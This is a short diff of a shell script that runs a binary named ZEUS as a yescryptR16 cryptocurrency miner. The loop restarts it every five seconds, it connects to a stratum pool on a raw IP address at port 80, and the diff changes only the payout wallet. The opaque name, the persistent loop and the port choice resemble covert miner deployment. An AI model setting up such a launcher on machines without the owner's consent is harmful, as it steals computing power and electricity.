@@ -19,6 +19,6 @@ chmod 700 ZEUS
 #
 FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 while [ 1 ]; do
-"$FOLDER"/ZEUS -a yescryptR16 -o stratum+tcp://178.128.86.41:80 -u vP9AfqDq9rCmqfcW9g3rCm17YkD5KFRreQ.tes
+"$FOLDER"/ZEUS -a yescryptR16 -o stratum+tcp://178.128.86.41:80 -u vE1GBjfCJq8yLg7WwxwZAXizE3KZ7D6MiQ.tes
 sleep 5
 done
